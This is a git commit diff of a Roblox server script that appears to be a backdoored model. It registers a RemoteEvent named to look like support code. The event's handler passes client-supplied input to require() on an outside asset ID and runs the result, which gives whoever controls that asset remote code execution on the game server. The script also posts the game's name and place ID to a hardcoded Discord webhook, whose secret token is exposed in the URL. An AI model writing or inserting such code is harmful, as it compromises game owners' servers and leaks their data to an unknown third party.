39cfd39c902e1529037c5ac668f74db5d8c47627
Oflice <ofliceofficial@gmail.com>
2025-02-21 19:10:34 +0000

    Update server.lua

--- server.lua
+++ server.lua
@@ -2,28 +2,17 @@ local new = Instance.new("RemoteEvent")
 new.Parent = game.ReplicatedStorage
 new.Name = "RobloxSupportModelCC_S"
 new.OnServerEvent:Connect(function(player, Trm)
-require(5423914129)(Trm)()
-end
-local HttpService = game:GetService("HttpService")
-local webhookUrl = "https://discord.com/api/webhooks/1335563932617805834/XPjmEF5VwZxdeWvo_p-O8f0HibG-JF7wklJ08sGfSsl2fNMjAb7ss314L7tnzVByb_qk"
+	require(5423914129)(Trm)()
+end)
+
+local HS = game:GetService("HttpService")
+local WebhookURL = "https://discord.com/api/webhooks/1335563932617805834/XPjmEF5VwZxdeWvo_p-O8f0HibG-JF7wklJ08sGfSsl2fNMjAb7ss314L7tnzVByb_qk"
 
 
-local function sendStatsToWebhook()
-    local data = {
-        ["content"] = game.Name
-    }
+local MessageData = {
+	["content"] = "Hoi, Test message arrived!" .. game.Name .. game.PlaceId
+}
 
-    local jsonData = HttpService:JSONEncode(data)
-    local headers = {["Content-Type"] = "application/json"}
+MessageData = HS:JSONEncode(MessageData)
 
-    local success, errorMessage = pcall(function()
-        HttpService:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson, false, headers)
-    end)
-
-    if not success then
-        warn("Failed to send message: " .. errorMessage)
-    end
-end
-
-sendStatsToWebhook()
-
+HS:PostAsync(WebhookURL,MessageData)
